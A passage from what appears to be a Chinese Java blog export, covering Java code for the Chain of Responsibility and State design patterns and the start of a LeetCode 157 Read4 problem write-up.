<h3 id="Trouble"><a href="#Trouble" class="headerlink" title="Trouble"></a>Trouble</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Trouble</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> number;             </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Trouble</span><span class="params">(<span class="keyword">int</span> number)</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">this</span>.number = number;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getNumber</span><span class="params">()</span> </span>&#123;        </span><br><span class="line">        <span class="keyword">return</span> number;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;      </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"[Trouble "</span> + number + <span class="string">"]"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="LimitSupport"><a href="#LimitSupport" class="headerlink" title="LimitSupport"></a>LimitSupport</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LimitSupport</span> <span class="keyword">extends</span> <span class="title">Support</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> limit;                              </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LimitSupport</span><span class="params">(String name, <span class="keyword">int</span> limit)</span> </span>&#123;   </span><br><span class="line">        <span class="keyword">super</span>(name);</span><br><span class="line">        <span class="keyword">this</span>.limit = limit;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">resolve</span><span class="params">(Trouble trouble)</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">if</span> (trouble.getNumber() &lt; limit) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="NoSupport"><a href="#NoSupport" class="headerlink" title="NoSupport"></a>NoSupport</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NoSupport</span> <span class="keyword">extends</span> <span class="title">Support</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NoSupport</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">resolve</span><span class="params">(Trouble trouble)</span> </span>&#123;     </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="OddSupport"><a href="#OddSupport" class="headerlink" title="OddSupport"></a>OddSupport</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OddSupport</span> <span class="keyword">extends</span> <span class="title">Support</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">OddSupport</span><span class="params">(String name)</span> </span>&#123;                </span><br><span class="line">        <span class="keyword">super</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">resolve</span><span class="params">(Trouble trouble)</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">if</span> (trouble.getNumber() % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SpecialSupport"><a href="#SpecialSupport" class="headerlink" title="SpecialSupport"></a>SpecialSupport</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpecialSupport</span> <span class="keyword">extends</span> <span class="title">Support</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> number;                                 </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SpecialSupport</span><span class="params">(String name, <span class="keyword">int</span> number)</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">super</span>(name);</span><br><span class="line">        <span class="keyword">this</span>.number = number;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">resolve</span><span class="params">(Trouble trouble)</span> </span>&#123;        </span><br><span class="line">        <span class="keyword">if</span> (trouble.getNumber() == number) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Support"><a href="#Support" class="headerlink" title="Support"></a>Support</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Support</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;                    </span><br><span class="line">    <span class="keyword">private</span> Support next;                   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Support</span><span class="params">(String name)</span> </span>&#123;           </span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Support <span class="title">setNext</span><span class="params">(Support next)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">this</span>.next = next;</span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">support</span><span class="params">(Trouble trouble)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span> (resolve(trouble)) &#123;</span><br><span class="line">            done(trouble);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            next.support(trouble);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            fail(trouble);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;              </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"["</span> + name + <span class="string">"]"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">boolean</span> <span class="title">resolve</span><span class="params">(Trouble trouble)</span></span>; </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">done</span><span class="params">(Trouble trouble)</span> </span>&#123;  </span><br><span class="line">        System.out.println(trouble + <span class="string">" is resolved by "</span> + <span class="keyword">this</span> + <span class="string">"."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">fail</span><span class="params">(Trouble trouble)</span> </span>&#123;  </span><br><span class="line">        System.out.println(trouble + <span class="string">" cannot be resolved."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Support alice   = <span class="keyword">new</span> NoSupport(<span class="string">"Alice"</span>);</span><br><span class="line">        Support bob     = <span class="keyword">new</span> LimitSupport(<span class="string">"Bob"</span>, <span class="number">100</span>);</span><br><span class="line">        Support charlie = <span class="keyword">new</span> SpecialSupport(<span class="string">"Charlie"</span>, <span class="number">429</span>);</span><br><span class="line">        Support diana   = <span class="keyword">new</span> LimitSupport(<span class="string">"Diana"</span>, <span class="number">200</span>);</span><br><span class="line">        Support elmo    = <span class="keyword">new</span> OddSupport(<span class="string">"Elmo"</span>);</span><br><span class="line">        Support fred    = <span class="keyword">new</span> LimitSupport(<span class="string">"Fred"</span>, <span class="number">300</span>);</span><br><span class="line">        alice.setNext(bob).setNext(charlie).setNext(diana).setNext(elmo).setNext(fred);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">500</span>; i += <span class="number">33</span>) &#123;</span><br><span class="line">            alice.support(<span class="keyword">new</span> Trouble(i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>责任链模式最大的优点在于它弱化了发出请求的人和处理请求的人之间的关系。Client角色向第一个ConcreteHandler发出请求，然后请求会在责任链中传播，知道某个ConcreteHandler处理该请求。</p>
<p>如果不使用该模式，就必须由某个伟大的角色知道“谁应该处理什么请求”，这有点类似中央集权制。而让“发出请求的人”知道“谁应该处理该请求”并不明智，因为如果发出请求的人不得不知道处理请求的人各自的责任分担情况，就会降低其作为可复用组件的独立性。</p>
<p>使用责任链模式可以根据情况动态地重组组织链。</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>责任链模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-状态模式</title>
    <url>/2020/04/10/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%8A%B6%E6%80%81%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="状态模式"><a href="#状态模式" class="headerlink" title="状态模式"></a>状态模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>在状态模式（State Pattern）中，类的行为是基于它的状态改变的。</p>
<p>在状态模式中，我们创建表示各种状态的对象和一个行为随着状态对象改变而改变的 对象。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-10-state1.png" alt="状态模式类图"></p>
<h3 id="State（状态）"><a href="#State（状态）" class="headerlink" title="State（状态）"></a>State（状态）</h3><p>表示了状态，定义了根据不同状态进行不同处理的接口。该接口是那些<strong>处理内容依赖于状态的方法的集合</strong>。</p>
<h3 id="ConcreteState"><a href="#ConcreteState" class="headerlink" title="ConcreteState"></a>ConcreteState</h3><p>表示各个具体状态，它实现了State接口</p>
<h3 id="Context（状况、前后关系、上下文）"><a href="#Context（状况、前后关系、上下文）" class="headerlink" title="Context（状况、前后关系、上下文）"></a>Context（状况、前后关系、上下文）</h3><p>持有表示当前状态的ConcreteState对象。此外，它还定义了供外部滴啊用着使用State模式的接口。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-10-state2.png" alt="状态模式示例类图"></p>
<h3 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Context</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">setClock</span><span class="params">(<span class="keyword">int</span> hour)</span></span>;                </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">changeState</span><span class="params">(State state)</span></span>;          </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">callSecurityCenter</span><span class="params">(String msg)</span></span>;    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">recordLog</span><span class="params">(String msg)</span></span>;             </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DayState"><a href="#DayState" class="headerlink" title="DayState"></a>DayState</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DayState</span> <span class="keyword">implements</span> <span class="title">State</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> DayState singleton = <span class="keyword">new</span> DayState();</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">DayState</span><span class="params">()</span> </span>&#123;                                </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> State <span class="title">getInstance</span><span class="params">()</span> </span>&#123;                </span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doClock</span><span class="params">(Context context, <span class="keyword">int</span> hour)</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">if</span> (hour &lt; <span class="number">9</span> || <span class="number">17</span> &lt;= hour) &#123;</span><br><span class="line">            context.changeState(NightState.getInstance());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doUse</span><span class="params">(Context context)</span> </span>&#123;                </span><br><span class="line">        context.recordLog(<span class="string">"4"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doAlarm</span><span class="params">(Context context)</span> </span>&#123;             </span><br><span class="line">        context.callSecurityCenter(<span class="string">"3"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPhone</span><span class="params">(Context context)</span> </span>&#123;              </span><br><span class="line">        context.callSecurityCenter(<span class="string">"2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;                          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="NightState"><a href="#NightState" class="headerlink" title="NightState"></a>NightState</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NightState</span> <span class="keyword">implements</span> <span class="title">State</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> NightState singleton = <span class="keyword">new</span> NightState();</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">NightState</span><span class="params">()</span> </span>&#123;                              </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> State <span class="title">getInstance</span><span class="params">()</span> </span>&#123;                 </span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doClock</span><span class="params">(Context context, <span class="keyword">int</span> hour)</span> </span>&#123;    </span><br><span class="line">        <span class="keyword">if</span> (<span class="number">9</span> &lt;= hour &amp;&amp; hour &lt; <span class="number">17</span>) &#123;</span><br><span class="line">            context.changeState(DayState.getInstance());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doUse</span><span class="params">(Context context)</span> </span>&#123;                </span><br><span class="line">        context.callSecurityCenter(<span class="string">"1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doAlarm</span><span class="params">(Context context)</span> </span>&#123;              </span><br><span class="line">        context.callSecurityCenter(<span class="string">"1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPhone</span><span class="params">(Context context)</span> </span>&#123;              </span><br><span class="line">        context.recordLog(<span class="string">"1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;                          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"2"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SafeFrame"><a href="#SafeFrame" class="headerlink" title="SafeFrame"></a>SafeFrame</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SafeFrame</span> <span class="keyword">extends</span> <span class="title">Frame</span> <span class="keyword">implements</span> <span class="title">ActionListener</span>, <span class="title">Context</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> TextField textClock = <span class="keyword">new</span> TextField(<span class="number">60</span>);        </span><br><span class="line">    <span class="keyword">private</span> TextArea textScreen = <span class="keyword">new</span> TextArea(<span class="number">10</span>, <span class="number">60</span>);     </span><br><span class="line">    <span class="keyword">private</span> Button buttonUse = <span class="keyword">new</span> Button(<span class="string">"123"</span>);      </span><br><span class="line">    <span class="keyword">private</span> Button buttonAlarm = <span class="keyword">new</span> Button(<span class="string">"456"</span>);    </span><br><span class="line">    <span class="keyword">private</span> Button buttonPhone = <span class="keyword">new</span> Button(<span class="string">"789"</span>);    </span><br><span class="line">    <span class="keyword">private</span> Button buttonExit = <span class="keyword">new</span> Button(<span class="string">"101112"</span>);         </span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> State state = DayState.getInstance();           </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SafeFrame</span><span class="params">(String title)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(title);</span><br><span class="line">        setBackground(Color.lightGray);</span><br><span class="line">        setLayout(<span class="keyword">new</span> BorderLayout());</span><br><span class="line">        add(textClock, BorderLayout.NORTH);</span><br><span class="line">        textClock.setEditable(<span class="keyword">false</span>);</span><br><span class="line">        add(textScreen, BorderLayout.CENTER);</span><br><span class="line">        textScreen.setEditable(<span class="keyword">false</span>);</span><br><span class="line">        Panel panel = <span class="keyword">new</span> Panel();</span><br><span class="line">        panel.add(buttonUse);</span><br><span class="line">        panel.add(buttonAlarm);</span><br><span class="line">        panel.add(buttonPhone);</span><br><span class="line">        panel.add(buttonExit);</span><br><span class="line">        add(panel, BorderLayout.SOUTH);</span><br><span class="line">        pack();</span><br><span class="line">        show();</span><br><span class="line">        buttonUse.addActionListener(<span class="keyword">this</span>);</span><br><span class="line">        buttonAlarm.addActionListener(<span class="keyword">this</span>);</span><br><span class="line">        buttonPhone.addActionListener(<span class="keyword">this</span>);</span><br><span class="line">        buttonExit.addActionListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">        System.out.println(e.toString());</span><br><span class="line">        <span class="keyword">if</span> (e.getSource() == buttonUse) &#123;           </span><br><span class="line">            state.doUse(<span class="keyword">this</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.getSource() == buttonAlarm) &#123;  </span><br><span class="line">            state.doAlarm(<span class="keyword">this</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.getSource() == buttonPhone) &#123;  </span><br><span class="line">            state.doPhone(<span class="keyword">this</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.getSource() == buttonExit) &#123;   </span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setClock</span><span class="params">(<span class="keyword">int</span> hour)</span> </span>&#123;</span><br><span class="line">        String clockstring = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">if</span> (hour &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            clockstring += <span class="string">"0"</span> + hour + <span class="string">":00"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            clockstring += hour + <span class="string">":00"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(clockstring);</span><br><span class="line">        textClock.setText(clockstring);</span><br><span class="line">        state.doClock(<span class="keyword">this</span>, hour);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">changeState</span><span class="params">(State state)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"2"</span> + <span class="keyword">this</span>.state + <span class="string">"3"</span> + state + <span class="string">"4"</span>);</span><br><span class="line">        <span class="keyword">this</span>.state = state;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">callSecurityCenter</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        textScreen.append(<span class="string">"call! "</span> + msg + <span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">recordLog</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        textScreen.append(<span class="string">"record ... "</span> + msg + <span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="State"><a href="#State" class="headerlink" title="State"></a>State</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">State</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">doClock</span><span class="params">(Context context, <span class="keyword">int</span> hour)</span></span>;    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">doUse</span><span class="params">(Context context)</span></span>;                </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">doAlarm</span><span class="params">(Context context)</span></span>;              </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">doPhone</span><span class="params">(Context context)</span></span>;              </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SafeFrame frame = <span class="keyword">new</span> SafeFrame(<span class="string">"State Sample"</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> hour = <span class="number">0</span>; hour &lt; <span class="number">24</span>; hour++) &#123;</span><br><span class="line">                frame.setClock(hour);   </span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>状态模式</tag>
      </tags>
  </entry>
  <entry>
    <title>157. 用 Read4 读取 N 个字符</title>
    <url>/2020/04/09/LeetCode/leetcode-000157-%E7%94%A8%20Read4%20%E8%AF%BB%E5%8F%96%20N%20%E4%B8%AA%E5%AD%97%E7%AC%A6/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个文件，并且该文件只能通过给定的 <code>read4</code> 方法来读取，请实现一个方法使其能够读取 n 个字符。</p>
<p><strong>read4 方法：</strong></p>
<p>API <code>read4</code> 可以从文件中读取 4 个连续的字符，并且将它们写入缓存数组 <code>buf</code> 中。</p>
<p>返回值为实际读取的字符个数。</p>
<p>注意 <code>read4()</code> 自身拥有文件指针，很类似于 C 语言中的 <code>FILE *fp</code> 。</p>
<p><strong>read4 的定义：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参数类型: char[] buf</span><br><span class="line">返回类型: int</span><br><span class="line"></span><br><span class="line">注意: buf[] 是目标缓存区不是源缓存区，read4 的返回结果将会复制到 buf[] 当中。</span><br></pre></td></tr></table></figure>

<p>下列是一些使用 <code>read4</code> 的例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">File file(&quot;abcdefghijk&quot;); &#x2F;&#x2F; 文件名为 &quot;abcdefghijk&quot;， 初始文件指针 (fp) 指向 &#39;a&#39; </span><br><span class="line">char[] buf &#x3D; new char[4]; &#x2F;&#x2F; 创建一个缓存区使其能容纳足够的字符</span><br><span class="line">read4(buf); &#x2F;&#x2F; read4 返回 4。现在 buf &#x3D; &quot;abcd&quot;，fp 指向 &#39;e&#39;</span><br><span class="line">read4(buf); &#x2F;&#x2F; read4 返回 4。现在 buf &#x3D; &quot;efgh&quot;，fp 指向 &#39;i&#39;</span><br><span class="line">read4(buf); &#x2F;&#x2F; read4 返回 3。现在 buf &#x3D; &quot;ijk&quot;，fp 指向文件末尾</span><br></pre></td></tr></table></figure>

<p><strong>read 方法：</strong></p>
<p>通过使用 read4 方法，实现 read 方法。该方法可以从文件中读取 n 个字符并将其存储到缓存数组 buf 中。您 不能 直接操作文件。</p>
<p>返回值为实际读取的字符。</p>
<p><strong>read 的定义：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参数类型:   char[] buf, int n</span><br><span class="line">返回类型:   int</span><br><span class="line"></span><br><span class="line">注意: buf[] 是目标缓存区不是源缓存区，你需要将结果写入 buf[] 中。</span><br></pre></td></tr></table></figure>

<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： file &#x3D; &quot;abc&quot;, n &#x3D; 4</span><br><span class="line">输出： 3</span><br><span class="line">解释： 当执行你的 rand 方法后，buf 需要包含 &quot;abc&quot;。 文件一共 3 个字符，因此返回 3。 注意 &quot;abc&quot; 是文件的内容，不是 buf 的内容，buf 是你需要写入结果的目标缓存区。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： file &#x3D; &quot;abcde&quot;, n &#x3D; 5</span><br><span class="line">输出： 5</span><br><span class="line">解释： 当执行你的 rand 方法后，buf 需要包含 &quot;abcde&quot;。文件共 5 个字符，因此返回 5。</span><br></pre></td></tr></table></figure>



<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： file &#x3D; &quot;abcdABCD1234&quot;, n &#x3D; 12</span><br><span class="line">输出： 12</span><br><span class="line">解释： 当执行你的 rand 方法后，buf 需要包含 &quot;abcdABCD1234&quot;。文件一共 12 个字符，因此返回 12。</span><br></pre></td></tr></table></figure>

<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： file &#x3D; &quot;leetcode&quot;, n &#x3D; 5</span><br><span class="line">输出： 5</span><br><span class="line">解释： 当执行你的 rand 方法后，buf 需要包含 &quot;leetc&quot;。文件中一共 5 个字符，因此返回 5。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>读取一次，拷贝一次到buf</p>
